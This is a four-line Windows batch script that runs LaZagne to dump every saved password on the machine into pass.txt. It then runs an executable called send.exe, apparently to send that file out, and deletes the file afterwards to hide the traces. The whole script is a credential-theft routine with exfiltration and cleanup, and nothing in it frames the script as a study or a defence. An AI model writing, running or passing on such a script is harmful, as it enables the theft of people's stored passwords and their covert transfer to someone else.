@Echo off
laZagne.exe all > pass.txt
send.exe
del /s "pass.txt"